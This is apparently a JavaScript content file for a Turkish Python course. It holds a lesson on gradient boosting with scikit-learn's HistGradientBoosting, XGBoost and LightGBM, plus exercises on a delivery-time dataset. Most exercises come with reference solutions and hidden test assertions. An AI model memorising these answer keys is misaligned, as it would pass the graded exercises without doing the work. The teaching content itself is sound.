        q: '<p>Erken durdurmayı elle uygula. <code>erken_durdur(model, X_va, y_va, sabir=5)</code>: <code>model</code> eğitilmiş bir boosting modeli; <code>model.staged_predict_proba(X_va)</code> her turdan sonraki olasılıkları sırayla verir. Her tur için <code>sklearn.metrics.log_loss</code> hesapla. Kayıp, o ana kadarki en iyiden <b>kesin olarak</b> küçükse en iyiyi güncelle; art arda <code>sabir</code> tur iyileşme olmazsa dur. <code>(en_iyi_tur, en_iyi_kayip)</code> döndür: tur 1\'den başlar, kayıp 4 basamak.</p>',
        start: 'from sklearn.metrics import log_loss\n\ndef erken_durdur(model, X_va, y_va, sabir=5):\n    pass\n',
        sol: 'from sklearn.metrics import log_loss\n\ndef erken_durdur(model, X_va, y_va, sabir=5):\n    en_iyi_tur, en_iyi = 0, float("inf")\n    bekleme = 0\n    for tur, olas in enumerate(model.staged_predict_proba(X_va), start=1):\n        kayip = log_loss(y_va, olas, labels=[0, 1])\n        if kayip < en_iyi:\n            en_iyi_tur, en_iyi, bekleme = tur, kayip, 0\n        else:\n            bekleme += 1\n            if bekleme >= sabir:\n                break\n    return en_iyi_tur, round(en_iyi, 4)\n',
        tests: 'import numpy as np\nclass Sahte:\n    def __init__(self, pler):\n        self.pler = pler\n        self.uretilen = 0\n    def staged_predict_proba(self, X):\n        for p in self.pler:\n            self.uretilen += 1\n            yield np.array([[1 - p, p], [p, 1 - p]])\ny = [1, 0]\nm = Sahte([0.6, 0.7, 0.8, 0.75, 0.7, 0.72, 0.9])\ntur, kayip = erken_durdur(m, None, y, sabir=3)\nassert tur == 3, f"En iyi kayıp 3. turda (p=0.8), gelen {tur}"\nassert kayip == round(-np.log(0.8), 4), "Kayıp 3. turdaki log_loss olmalı"\nassert m.uretilen == 6, f"3 tur iyileşme olmayınca 6. turda durmalı; üretilen tur {m.uretilen}"\nm2 = Sahte([0.6, 0.7, 0.8, 0.75, 0.7, 0.72, 0.9])\nassert erken_durdur(m2, None, y, sabir=5)[0] == 7, "Sabır 5 iken 7. tur (p=0.9) da görülür"\nfrom sklearn.ensemble import GradientBoostingClassifier\nfrom sklearn.datasets import make_classification\nXs, ys = make_classification(n_samples=400, flip_y=0.2, random_state=0)\ngb = GradientBoostingClassifier(n_estimators=150, learning_rate=0.3, random_state=0).fit(Xs[:300], ys[:300])\nt, k = erken_durdur(gb, Xs[300:], ys[300:], sabir=10)\nassert 1 <= t < 150, "Gürültülü veride en iyi tur 150 turdan önce gelmeli"\n',
        hints: ['enumerate(model.staged_predict_proba(X_va), start=1) ile tur numarasını tut.', 'Bir "bekleme" sayacı tut: iyileşmede sıfırla, değilse artır; sabıra ulaşınca break.', 'log_loss(y_va, olas, labels=[0, 1]) her tur için kaybı verir.'],
        why: 'Üreteç tabanlı staged_predict_proba sayesinde gereksiz turlar hiç hesaplanmaz. HistGradientBoosting\'in early_stopping=True ve n_iter_no_change ayarları aynı mantığı eğitim sırasında uygular.' }
    ],
    faq: [
      { q: 'Model düşük AUC verdi; yine de açıklamaya ve adalet denetimine değer mi?',
        a: 'Evet. Zayıf bir model bile karar sürecine girdiyse kimde yanıldığını ve gruplara nasıl davrandığını bilmen gerekir. Ayrıca açıklama araçları çoğu zaman modelin neden zayıf olduğunu da gösterir: belirleyici bilgi (ör. maaş artışı, yönetici değişimi) özelliklerde yoktur.' },
      { q: 'HalvingGridSearchCV neden "experimental" altında?',
        a: 'scikit-learn API\'si ileride değişebilecek özellikleri deneysel olarak işaretler; <code>from sklearn.experimental import enable_halving_search_cv</code> satırı bu sınıfları bilinçli olarak açmanı ister. Davranış güvenilirdir, yalnız parametre adları gelecekte değişebilir; sürümünü requirements dosyasında sabitle.' }
    ],
    mistakes: [
      { bad: 'calisma = X\ncalisma["level"] = 3',
        good: 'calisma = X.copy()\ncalisma["level"] = 3',
        why: 'Atama kopya oluşturmaz; açıklama hesabı orijinal veriyi sessizce bozar.' }
    ] }
);
})(window);
/* Kesit Python — 'ml-regresyon-siniflandirma' dersi uzantısı: HistGradientBoosting ayarları, kategorik destek ve XGBoost/LightGBM eşlemesi (AUDIT Ekle-8) */
(function (W) {
'use strict';
const X = W.PY_EXT = W.PY_EXT || [];
X.push(
  { id: 'ml-regresyon-siniflandirma',
    min: 28,
    html: `<h2>Derinleş: gradient boosting uygulamada (HistGradientBoosting, XGBoost, LightGBM)</h2><p>Tablo verisinde (satış, kredi, lojistik) en sık kazanan model ailesi gradient boosting'dir: sığ ağaçlar sırayla eklenir ve her yeni ağaç öncekilerin <b>hatasını</b> (artıkları, residuals) düzeltmeye çalışır. Tahmin, başlangıç değeri artı her ağacın <code>learning_rate</code> ile küçültülmüş katkılarının toplamıdır. Bu bölümde scikit-learn'ün hızlı uygulaması <code>HistGradientBoosting</code>'i Lezzet Kurye'nin gerçek teslimat verisiyle (<code>lezzet_kurye</code>, 6638 teslim edilmiş sipariş) ayarlayacak, sonra aynı ayarların XGBoost ve LightGBM'deki karşılıklarını göreceksin.</p><pre class="py">artik_tahmin = [30.0] * 4                 # başlangıç: ortalama süre (dk)
gercek = [25.0, 40.0, 35.0, 20.0]
for tur in range(3):
    artik = [g - t for g, t in zip(gercek, artik_tahmin)]
    duzeltme = [a * 0.5 for a in artik]   # "ağaç" artığı mükemmel bilseydi; lr = 0.5
    artik_tahmin = [t + d for t, d in zip(artik_tahmin, duzeltme)]
    print(tur + 1, [round(t, 1) for t in artik_tahmin])</pre><p>Her tur hatanın yarısını kapatır; küçük <code>learning_rate</code> daha çok tur ister ama genellikle daha iyi genelleşir. Gerçekte ağaç artığı tam bilemez; derinliği ve yaprak sayısı sınırlı olduğu için genel örüntüyü öğrenir.</p><h3>Neden "Hist"?</h3><p>Klasik <code>GradientBoostingClassifier</code> her bölme için tüm benzersiz değerleri dener. <code>HistGradientBoostingRegressor/Classifier</code> ise önce her sütunu en fazla 255 kutuya (bin) ayırır ve bölmeleri kutu sınırlarında arar; on binlerce satırda çok daha hızlıdır. Ayrıca eksik değerleri (NaN) kendisi yönetir ve kategorik sütunları one-hot yapmadan doğrudan kullanabilir.</p><pre class="py">import veri
import pandas as pd

def kurye_verisi():
    o = veri.oku("lezzet_kurye", "lk_orders")
    r = veri.oku("lezzet_kurye", "lk_restaurants")
    k = veri.oku("lezzet_kurye", "lk_couriers")
    s = veri.oku("lezzet_kurye", "lk_order_lines")
    o = o[o["status"] == "teslim"].copy()
    zaman = pd.to_datetime(o["placed_at"])
    o["saat"] = zaman.dt.hour
    o["hafta_sonu"] = (zaman.dt.dayofweek &gt;= 5).astype(int)
    o["sure_dk"] = (pd.to_datetime(o["delivered_at"]) - zaman).dt.total_seconds() / 60
    adet = s.groupby("order_id")["qty"].sum().rename("adet").reset_index()
    d = (o.merge(r[["restaurant_id", "cuisine", "city"]], on="restaurant_id")
          .merge(k[["courier_id", "vehicle"]], on="courier_id")
          .merge(adet, on="order_id"))
    d["restoran"] = d["restaurant_id"].astype(str)
    X = d[["saat", "hafta_sonu", "adet", "cuisine", "city", "vehicle", "restoran"]].copy()
    for c in ["cuisine", "city", "vehicle", "restoran"]:
        X[c] = X[c].astype("category")
    return X, d["sure_dk"]
from sklearn.model_selection import train_test_split
X, y = kurye_verisi()
X_tr, X_te, y_tr, y_te = train_test_split(X, y, test_size=0.25, random_state=0)
KATEGORIK = ["cuisine", "city", "vehicle", "restoran"]
from sklearn.ensemble import HistGradientBoostingRegressor
from sklearn.metrics import mean_absolute_error

print(X.shape, "| ortalama süre:", round(y.mean(), 1), "dk")
taban = mean_absolute_error(y_te, [y_tr.mean()] * len(y_te))
model = HistGradientBoostingRegressor(
    categorical_features=KATEGORIK,   # pandas category sütunları
    learning_rate=0.1, max_iter=500, max_leaf_nodes=15,
    early_stopping=True, validation_fraction=0.15, n_iter_no_change=10,
    random_state=0)
model.fit(X_tr, y_tr)
print("taban MAE:", round(taban, 2), "| HGB MAE:", round(mean_absolute_error(y_te, model.predict(X_te)), 2))
print("durduğu tur:", model.n_iter_)</pre><p>Model ortalamaya göre hatayı azaltıyor ama mucize beklenmemeli: teslimat süresini trafik, hava ve restoranın o anki yoğunluğu da belirler ve bunlar veride yok. Erken durdurma 500 tur yerine birkaç on turda durdu; <code>n_iter_</code> bunu gösterir.</p><h3>Önemli ayarlar</h3><div class="tbl-wrap"><table><tr><th>Parametre</th><th>Varsayılan</th><th>Etkisi</th></tr><tr><td><code>learning_rate</code></td><td>0.1</td><td>Her ağacın katkısını küçültür. Düşür (0.05) → daha çok tur, genelde daha iyi sonuç.</td></tr><tr><td><code>max_iter</code></td><td>100</td><td>En fazla ağaç sayısı. Erken durdurmayla birlikte üst sınır gibi düşün.</td></tr><tr><td><code>max_leaf_nodes</code></td><td>31</td><td>Ağaç başına yaprak; modelin karmaşıklığı. Asıl ayar budur.</td></tr><tr><td><code>max_depth</code></td><td>None</td><td>Derinlik sınırı; genelde max_leaf_nodes yeterli.</td></tr><tr><td><code>min_samples_leaf</code></td><td>20</td><td>Yapraktaki en az satır; büyütmek gürültüyü ezberlemeyi azaltır.</td></tr><tr><td><code>l2_regularization</code></td><td>0</td><td>Yaprak değerlerini küçülten ceza.</td></tr><tr><td><code>early_stopping</code></td><td>"auto"</td><td>10.000 satırdan büyük veride kendiliğinden açılır; <code>validation_fraction</code> ve <code>n_iter_no_change</code> ile birlikte çalışır.</td></tr><tr><td><code>categorical_features</code></td><td>"from_dtype" (yeni sürümler)</td><td>Kategorik sütunlar; ad listesi ya da bool maske ver. Kategori sayısı <code>max_bins</code>'i (255) aşmamalı.</td></tr><tr><td><code>monotonic_cst</code></td><td>None</td><td>"adet artınca süre azalmasın" gibi iş kuralını modele zorlar.</td></tr></table></div><div class="tip"><b>Ayar sırası</b>1) learning_rate=0.1 ve erken durdurmayla başla. 2) max_leaf_nodes (15–63) ve min_samples_leaf (20–200) ara. 3) l2_regularization ekle. 4) En sonda learning_rate'i düşürüp max_iter'i büyüt. Aramayı çapraz doğrulamayla yap (pipeline dersindeki HalvingGridSearchCV burada çok işe yarar).</div><h3>XGBoost ve LightGBM karşılıkları</h3><p>İş ilanlarında XGBoost ve LightGBM adları sık geçer. İkisi de aynı fikrin bağımsız, çok optimize uygulamalarıdır ve scikit-learn uyumlu sınıflar (<code>XGBRegressor</code>, <code>LGBMRegressor</code>) sunar; yani pipeline, çapraz doğrulama ve arama araçları aynen çalışır. Kavramlar birebir eşlenir, adlar değişir:</p><div class="tbl-wrap"><table><tr><th>scikit-learn HGB</th><th>XGBoost</th><th>LightGBM</th></tr><tr><td>learning_rate</td><td>learning_rate (eta)</td><td>learning_rate</td></tr><tr><td>max_iter</td><td>n_estimators</td><td>n_estimators (num_iterations)</td></tr><tr><td>max_leaf_nodes</td><td>max_leaves</td><td>num_leaves</td></tr><tr><td>max_depth</td><td>max_depth (varsayılan 6)</td><td>max_depth (varsayılan -1, sınırsız)</td></tr><tr><td>min_samples_leaf</td><td>min_child_weight (ağırlık toplamı, birebir değil)</td><td>min_child_samples</td></tr><tr><td>l2_regularization</td><td>reg_lambda</td><td>reg_lambda (lambda_l2)</td></tr><tr><td>max_bins</td><td>max_bin</td><td>max_bin</td></tr><tr><td>n_iter_no_change</td><td>early_stopping_rounds</td><td>callbacks=[early_stopping(n)]</td></tr><tr><td>categorical_features</td><td>enable_categorical=True + category dtype</td><td>category dtype ya da categorical_feature</td></tr><tr><td>(yok)</td><td>subsample, colsample_bytree</td><td>bagging_fraction, feature_fraction</td></tr></table></div><pre class="code"># pip install xgboost lightgbm
from xgboost import XGBRegressor
from lightgbm import LGBMRegressor, early_stopping

xgb = XGBRegressor(n_estimators=500, learning_rate=0.1, max_leaves=15, tree_method="hist",
                   enable_categorical=True, early_stopping_rounds=10, random_state=0)
xgb.fit(X_tr, y_tr, eval_set=[(X_te, y_te)], verbose=False)   # gerçekte ayrı bir doğrulama seti kullan
print(xgb.best_iteration)

lgbm = LGBMRegressor(n_estimators=500, learning_rate=0.1, num_leaves=15, random_state=0, verbose=-1)
lgbm.fit(X_tr, y_tr, eval_set=[(X_te, y_te)], callbacks=[early_stopping(10, verbose=False)])
print(lgbm.best_iteration_)</pre><div class="warn"><b>Erken durdurmada test sızıntısı</b>Yukarıdaki kısa örnekte <code>eval_set</code> olarak test seti verildi; gerçek projede bu sızıntıdır, çünkü tur sayısını test setine bakarak seçersin. Eğitim verisinden ayrı bir doğrulama parçası ayır; HGB'nin <code>validation_fraction</code> ayarı bunu senin yerine yapar.</div><div class="note"><b>Gerçek işte</b>Kaggle tablo yarışmalarının ve bankaların kredi skor kartlarının büyük kısmı boosting modelleridir. Mülakatlarda sık sorulan sorular: "learning_rate ile n_estimators ilişkisi nedir?", "aşırı öğrenmeyi hangi ayarlarla kontrol edersin?", "kategorik sütunu nasıl verirsin?" Bu tabloyu bilmek üç soruyu da cevaplar. Kütüphane seçiminde ekip standardı belirleyicidir; scikit-learn HGB ek bağımlılık istemediği için iyi bir varsayılandır.</div>`,
    ex: [
      { t: 'mc',
        stage: 'Isınma',
        q: 'Boosting modelinde <code>learning_rate</code>\'i 0.1\'den 0.02\'ye düşürdün, diğer her şey aynı. Ne beklersin?',
        o: ['Aynı başarı için yaklaşık 5 kat daha çok tur gerekir; erken durdurma daha geç tetiklenir', 'Model daha hızlı eğitilir çünkü her ağaç daha küçük ve daha sığ kurulur', 'Ağaçların yaprak sayısı öğrenme hızıyla orantılı olarak kendiliğinden azalır', 'Hiçbir fark olmaz; learning_rate yalnız sınıflandırmada kullanılır'],
        a: 0,
        why: 'learning_rate her ağacın katkısını ölçekler. Küçük adımlarla aynı yola gitmek daha çok adım ister; karşılığında genelleme çoğu zaman iyileşir. Ağaç yapısı max_leaf_nodes ile belirlenir.' },
      { t: 'mc',
        stage: 'Isınma',
        q: 'Lezzet Kurye verisinde 30 değerli <code>restoran</code> sütununu HistGradientBoosting\'e nasıl vermek en uygunudur?',
        o: ['Restoran numarasını tamsayı olarak vermek; ağaç zaten uygun bölmeyi kendisi bulur', 'category tipine çevirip categorical_features ile belirtmek; ağaç kategorileri gruplar', 'One-hot ile 30 sütuna açmak zorunludur; boosting kategorik veri kabul etmez', 'Sütunu tamamen atmak; 30 farklı değer ağaç modelleri için çok fazladır'],
        a: 1,
        why: 'Tamsayı kodlama yapay bir sıra (7 < 12) varsayar. One-hot çalışır ama her bölmede tek kategoriyi ayırabildiği için verimsizdir. Doğal kategorik destek, kategori kümelerini tek bölmede ayırabilir. 255\'ten az kategori sınırı vardır.' },
      { t: 'predict',
        stage: 'Kodu oku',
        q: 'Artıklarla düzeltme yapan "boosting" iskeleti. Bu kod ne yazdırır?',
        code: 'gercek = [10.0, 20.0]\ntahmin = [15.0, 15.0]\nfor _ in range(2):\n    artik = [g - t for g, t in zip(gercek, tahmin)]\n    tahmin = [t + 0.5 * a for t, a in zip(tahmin, artik)]\nprint(tahmin)\n',
        o: ['[11.25, 18.75]', '[12.5, 17.5]', '[10.0, 20.0]', '[13.75, 16.25]'],
        a: 0,
        why: '1. tur: artıklar -5, +5 → tahmin 12.5, 17.5. 2. tur: artıklar -2.5, +2.5 → 11.25, 18.75. Her tur kalan hatanın yarısını kapatır.' },
      { t: 'order',
        stage: 'Kodu oku',
        q: '<p>Kategorik sütunu category tipine çevirip erken durdurmalı HistGradientBoosting eğiten ve kaçıncı turda durduğunu yazdıran programın satırlarını sırala.</p>',
        lines: ['import pandas as pd', 'from sklearn.ensemble import HistGradientBoostingRegressor', 'X = pd.DataFrame({"adet": list(range(60)) * 3, "arac": ["moto", "araba", "bisiklet"] * 60})', 'y = X["adet"] * 0.5 + X["arac"].map({"moto": 20, "araba": 25, "bisiklet": 30})', 'X["arac"] = X["arac"].astype("category")', 'model = HistGradientBoostingRegressor(categorical_features=["arac"], early_stopping=True, n_iter_no_change=5, random_state=0)', 'model.fit(X, y)', 'print(model.n_iter_ < 100)'],
        expect: 'True\n',
        needs: ['pandas'],
        hint: 'Hedef, arac metin hâlindeyken map ile hesaplanmalı; tip dönüşümü ondan sonra gelir.',
        why: 'y, metin değerlere map uygulayarak hesaplanır; sonra sütun category yapılır ve model eğitilir. Erken durdurma varsayılan 100 turdan önce durdurur.' },
      { t: 'code',
        id: 'ml-regresyon-siniflandirma-w1',
        stage: 'Rehberli',
        diff: 2,
        needs: ['pandas'],
        q: '<p>Lezzet Kurye\'nin gerçek tablolarından özellik tablosu kur: <code>sure_ve_ozellik()</code> fonksiyonu yalnız <code>status == "teslim"</code> siparişleri alsın ve şu sütunlu DataFrame döndürsün: <code>order_id</code>, <code>saat</code> (placed_at saati), <code>adet</code> (lk_order_lines\'tan sipariş başına qty toplamı), <code>vehicle</code> (kuryenin aracı, category tipinde), <code>sure_dk</code> (delivered_at − placed_at, dakika, float).</p>',
        guide: ['lk_orders\'ı oku ve teslim edilenleri süz.', 'placed_at ve delivered_at\'i pd.to_datetime ile çevir; farkın total_seconds() / 60 değeri süredir.', 'lk_order_lines\'ı order_id\'ye göre grupla, qty topla; lk_couriers\'tan vehicle\'ı courier_id ile birleştir.', 'vehicle sütununu astype("category") yap ve istenen sütunları döndür.'],
        example: 'import pandas as pd\nt = pd.to_datetime(pd.Series(["2024-10-01 11:00:00"]))\nu = pd.to_datetime(pd.Series(["2024-10-01 11:42:30"]))\nprint(((u - t).dt.total_seconds() / 60).tolist(), t.dt.hour.tolist())\n',
        start: 'import veri\nimport pandas as pd\n\ndef sure_ve_ozellik():\n    o = veri.oku("lezzet_kurye", "lk_orders")\n    s = veri.oku("lezzet_kurye", "lk_order_lines")\n    k = veri.oku("lezzet_kurye", "lk_couriers")\n    # TODO: teslim edilenleri süz, saat ve süreyi hesapla\n    # TODO: adet ve araç bilgisini birleştir\n    return None\n',
        sol: 'import veri\nimport pandas as pd\n\ndef sure_ve_ozellik():\n    o = veri.oku("lezzet_kurye", "lk_orders")\n    s = veri.oku("lezzet_kurye", "lk_order_lines")\n    k = veri.oku("lezzet_kurye", "lk_couriers")\n    o = o[o["status"] == "teslim"].copy()\n    t0 = pd.to_datetime(o["placed_at"])\n    o["saat"] = t0.dt.hour\n    o["sure_dk"] = (pd.to_datetime(o["delivered_at"]) - t0).dt.total_seconds() / 60\n    adet = s.groupby("order_id")["qty"].sum().rename("adet").reset_index()\n    d = o.merge(adet, on="order_id").merge(k[["courier_id", "vehicle"]], on="courier_id")\n    d["vehicle"] = d["vehicle"].astype("category")\n    return d[["order_id", "saat", "adet", "vehicle", "sure_dk"]]\n',
        tests: 'd = sure_ve_ozellik()\nassert len(d) == 6638, f"Teslim edilen 6638 sipariş bekleniyor, gelen {len(d)}"\nassert list(d.columns) == ["order_id", "saat", "adet", "vehicle", "sure_dk"], "Sütun adları ve sırası"\nassert round(float(d["sure_dk"].mean()), 2) == 37.74, "Ortalama teslim süresi 37.74 dk olmalı"\nassert int(d["adet"].sum()) == 17926, "Toplam ürün adedi tutmalı"\nassert str(d["vehicle"].dtype) == "category", "vehicle category tipinde olmalı"\nassert round(float(d.groupby("vehicle", observed=True)["sure_dk"].mean()["bisiklet"]), 1) > round(float(d.groupby("vehicle", observed=True)["sure_dk"].mean()["motosiklet"]), 1), "Bisikletli teslimatlar motosikletten uzun sürüyor"\n',
        hints: ['Süre: (bitiş − başlangıç).dt.total_seconds() / 60', 's.groupby("order_id")["qty"].sum() sipariş başına adedi verir; reset_index ile birleştirilebilir tabloya çevir.', 'Kurye tablosundan yalnız courier_id ve vehicle sütunlarını alarak merge et.'],
        why: 'Model başarısının çoğu özellik mühendisliğinden gelir. Zaman damgalarından süre ve saat çıkarmak, satır tablosunu sipariş düzeyine toplamak ve boyut tablosundan bilgi eklemek en sık yapılan üç adımdır.' },
      { t: 'code',
        id: 'ml-regresyon-siniflandirma-w2',
        stage: 'Rehberli',
        diff: 2,
        needs: ['pandas'],
        q: '<p><code>hgb_egit(X_tr, y_tr, X_te, y_te)</code> yaz: <code>HistGradientBoostingRegressor</code> kur (<code>categorical_features=KATEGORIK</code>, <code>learning_rate=0.1</code>, <code>max_iter=500</code>, <code>max_leaf_nodes=15</code>, <code>early_stopping=True</code>, <code>validation_fraction=0.15</code>, <code>n_iter_no_change=10</code>, <code>random_state=0</code>), eğit ve <code>(model, test_mae)</code> döndür (MAE 2 basamak). Veri gerçek Lezzet Kurye tablolarından hazır geliyor.</p>',
        guide: ['HistGradientBoostingRegressor\'ı ve mean_absolute_error\'ı içe aktar.', 'Parametreleri görevdeki gibi vererek modeli kur ve fit et.', 'Test tahmininin MAE değerini round(…, 2) ile döndür.'],
        example: 'from sklearn.ensemble import HistGradientBoostingRegressor\nimport numpy as np\nX = np.arange(40).reshape(-1, 1)\nm = HistGradientBoostingRegressor(max_iter=30).fit(X, X.ravel() * 2)\nprint(m.n_iter_)\n',
        start: 'import veri\nimport pandas as pd\n\ndef kurye_verisi():\n    o = veri.oku("lezzet_kurye", "lk_orders")\n    r = veri.oku("lezzet_kurye", "lk_restaurants")\n    k = veri.oku("lezzet_kurye", "lk_couriers")\n    s = veri.oku("lezzet_kurye", "lk_order_lines")\n    o = o[o["status"] == "teslim"].copy()\n    zaman = pd.to_datetime(o["placed_at"])\n    o["saat"] = zaman.dt.hour\n    o["hafta_sonu"] = (zaman.dt.dayofweek >= 5).astype(int)\n    o["sure_dk"] = (pd.to_datetime(o["delivered_at"]) - zaman).dt.total_seconds() / 60\n    adet = s.groupby("order_id")["qty"].sum().rename("adet").reset_index()\n    d = (o.merge(r[["restaurant_id", "cuisine", "city"]], on="restaurant_id")\n          .merge(k[["courier_id", "vehicle"]], on="courier_id")\n          .merge(adet, on="order_id"))\n    d["restoran"] = d["restaurant_id"].astype(str)\n    X = d[["saat", "hafta_sonu", "adet", "cuisine", "city", "vehicle", "restoran"]].copy()\n    for c in ["cuisine", "city", "vehicle", "restoran"]:\n        X[c] = X[c].astype("category")\n    return X, d["sure_dk"]\nfrom sklearn.model_selection import train_test_split\nX, y = kurye_verisi()\nX_tr, X_te, y_tr, y_te = train_test_split(X, y, test_size=0.25, random_state=0)\nKATEGORIK = ["cuisine", "city", "vehicle", "restoran"]\n\ndef hgb_egit(X_tr, y_tr, X_te, y_te):\n    # TODO: modeli kur, eğit, MAE hesapla\n    pass\n',
        sol: 'import veri\nimport pandas as pd\n\ndef kurye_verisi():\n    o = veri.oku("lezzet_kurye", "lk_orders")\n    r = veri.oku("lezzet_kurye", "lk_restaurants")\n    k = veri.oku("lezzet_kurye", "lk_couriers")\n    s = veri.oku("lezzet_kurye", "lk_order_lines")\n    o = o[o["status"] == "teslim"].copy()\n    zaman = pd.to_datetime(o["placed_at"])\n    o["saat"] = zaman.dt.hour\n    o["hafta_sonu"] = (zaman.dt.dayofweek >= 5).astype(int)\n    o["sure_dk"] = (pd.to_datetime(o["delivered_at"]) - zaman).dt.total_seconds() / 60\n    adet = s.groupby("order_id")["qty"].sum().rename("adet").reset_index()\n    d = (o.merge(r[["restaurant_id", "cuisine", "city"]], on="restaurant_id")\n          .merge(k[["courier_id", "vehicle"]], on="courier_id")\n          .merge(adet, on="order_id"))\n    d["restoran"] = d["restaurant_id"].astype(str)\n    X = d[["saat", "hafta_sonu", "adet", "cuisine", "city", "vehicle", "restoran"]].copy()\n    for c in ["cuisine", "city", "vehicle", "restoran"]:\n        X[c] = X[c].astype("category")\n    return X, d["sure_dk"]\nfrom sklearn.model_selection import train_test_split\nX, y = kurye_verisi()\nX_tr, X_te, y_tr, y_te = train_test_split(X, y, test_size=0.25, random_state=0)\nKATEGORIK = ["cuisine", "city", "vehicle", "restoran"]\nfrom sklearn.ensemble import HistGradientBoostingRegressor\nfrom sklearn.metrics import mean_absolute_error\n\ndef hgb_egit(X_tr, y_tr, X_te, y_te):\n    model = HistGradientBoostingRegressor(\n        categorical_features=KATEGORIK, learning_rate=0.1, max_iter=500, max_leaf_nodes=15,\n        early_stopping=True, validation_fraction=0.15, n_iter_no_change=10, random_state=0)\n    model.fit(X_tr, y_tr)\n    return model, round(mean_absolute_error(y_te, model.predict(X_te)), 2)\n',
        tests: 'from sklearn.metrics import mean_absolute_error\nmodel, mae = hgb_egit(X_tr, y_tr, X_te, y_te)\ntaban = mean_absolute_error(y_te, [y_tr.mean()] * len(y_te))\nassert mae < taban - 0.3, f"HGB, ortalama tahmininden ({taban:.2f} dk) belirgin iyi olmalı; gelen {mae}"\nassert model.n_iter_ < 500, "Erken durdurma 500 turdan önce durdurmalı"\nassert model.is_categorical_ is not None and int(model.is_categorical_.sum()) == 4, "4 kategorik sütun tanınmalı"\n',
        hints: ['Tüm ayarlar kurucu (constructor) parametresidir.', 'mean_absolute_error(y_te, model.predict(X_te))'],
        why: 'Erken durdurma, eğitim verisinin %15\'ini doğrulama için ayırır ve 10 tur iyileşme yoksa durur. is_categorical_ hangi sütunların kategorik işlendiğini doğrulamanı sağlar.' },
      { t: 'code',
        id: 'ml-regresyon-siniflandirma-w3',
        stage: 'Kendin yaz',
        diff: 2,
        q: '<p>Ekip XGBoost\'tan scikit-learn HGB\'ye geçiyor. <code>xgb_den_hgb(p)</code> yaz: XGBoost parametre sözlüğünü <code>(hgb_parametreleri, karsiligi_yok)</code> demetine çevirsin. Eşleme: <code>learning_rate</code> ya da <code>eta</code> → <code>learning_rate</code>; <code>n_estimators</code> → <code>max_iter</code>; <code>max_leaves</code> → <code>max_leaf_nodes</code>; <code>max_depth</code> → <code>max_depth</code>; <code>reg_lambda</code> → <code>l2_regularization</code>; <code>max_bin</code> → <code>max_bins</code>; <code>early_stopping_rounds</code> → <code>n_iter_no_change</code> ve ek olarak <code>early_stopping=True</code>. Karşılığı olmayan anahtarlar alfabetik sıralı listede dönsün. XGBoost\'ta <code>max_leaves=0</code> "sınırsız" demektir: karşılığı <code>None</code>.</p>',
        start: 'def xgb_den_hgb(p):\n    pass\n',
        sol: 'ESLEME = {"learning_rate": "learning_rate", "eta": "learning_rate", "n_estimators": "max_iter",\n          "max_leaves": "max_leaf_nodes", "max_depth": "max_depth", "reg_lambda": "l2_regularization",\n          "max_bin": "max_bins", "early_stopping_rounds": "n_iter_no_change"}\n\ndef xgb_den_hgb(p):\n    hgb, yok = {}, []\n    for k, v in p.items():\n        if k not in ESLEME:\n            yok.append(k)\n            continue\n        if k == "max_leaves" and v == 0:\n            v = None\n        hgb[ESLEME[k]] = v\n        if k == "early_stopping_rounds":\n            hgb["early_stopping"] = True\n    return hgb, sorted(yok)\n',
        tests: 'h, y = xgb_den_hgb({"eta": 0.05, "n_estimators": 800, "max_leaves": 31, "subsample": 0.8, "colsample_bytree": 0.7})\nassert h == {"learning_rate": 0.05, "max_iter": 800, "max_leaf_nodes": 31}, f"Gelen {h}"\nassert y == ["colsample_bytree", "subsample"], "Karşılığı olmayanlar alfabetik"\nh2, _ = xgb_den_hgb({"early_stopping_rounds": 20, "reg_lambda": 1.0, "max_bin": 128, "max_leaves": 0})\nassert h2 == {"n_iter_no_change": 20, "early_stopping": True, "l2_regularization": 1.0, "max_bins": 128, "max_leaf_nodes": None}, f"Gelen {h2}"\nassert xgb_den_hgb({}) == ({}, [])\n',
        hints: ['Eşlemeyi bir sözlükte tut; eta ve learning_rate aynı hedefe gider.', 'early_stopping_rounds gördüğünde iki anahtar birden yaz.'],
        why: 'Kavramlar ortak olduğu için geçiş çoğunlukla ad değişikliğidir; satır ve sütun örnekleme (subsample, colsample_bytree) gibi bazı ayarların HGB\'de doğrudan karşılığı yoktur ve raporlanmalıdır.' },
      { t: 'code',
        id: 'ml-regresyon-siniflandirma-w4',
        stage: 'Kendin yaz',
        diff: 2,
        needs: ['pandas'],
        q: '<p><code>tur_sayilari(X_tr, y_tr, oranlar)</code> yaz: her <code>learning_rate</code> değeri için <code>HistGradientBoostingRegressor(categorical_features=KATEGORIK, learning_rate=oran, max_iter=1000, max_leaf_nodes=15, early_stopping=True, n_iter_no_change=10, random_state=0)</code> eğitsin ve <code>{oran: model.n_iter_}</code> sözlüğü döndürsün. Gerçek veride küçük öğrenme hızının daha çok tura ihtiyaç duyduğunu göreceksin.</p>',
        start: 'import veri\nimport pandas as pd\n\ndef kurye_verisi():\n    o = veri.oku("lezzet_kurye", "lk_orders")\n    r = veri.oku("lezzet_kurye", "lk_restaurants")\n    k = veri.oku("lezzet_kurye", "lk_couriers")\n    s = veri.oku("lezzet_kurye", "lk_order_lines")\n    o = o[o["status"] == "teslim"].copy()\n    zaman = pd.to_datetime(o["placed_at"])\n    o["saat"] = zaman.dt.hour\n    o["hafta_sonu"] = (zaman.dt.dayofweek >= 5).astype(int)\n    o["sure_dk"] = (pd.to_datetime(o["delivered_at"]) - zaman).dt.total_seconds() / 60\n    adet = s.groupby("order_id")["qty"].sum().rename("adet").reset_index()\n    d = (o.merge(r[["restaurant_id", "cuisine", "city"]], on="restaurant_id")\n          .merge(k[["courier_id", "vehicle"]], on="courier_id")\n          .merge(adet, on="order_id"))\n    d["restoran"] = d["restaurant_id"].astype(str)\n    X = d[["saat", "hafta_sonu", "adet", "cuisine", "city", "vehicle", "restoran"]].copy()\n    for c in ["cuisine", "city", "vehicle", "restoran"]:\n        X[c] = X[c].astype("category")\n    return X, d["sure_dk"]\nfrom sklearn.model_selection import train_test_split\nX, y = kurye_verisi()\nX_tr, X_te, y_tr, y_te = train_test_split(X, y, test_size=0.25, random_state=0)\nKATEGORIK = ["cuisine", "city", "vehicle", "restoran"]\n\ndef tur_sayilari(X_tr, y_tr, oranlar):\n    pass\n',
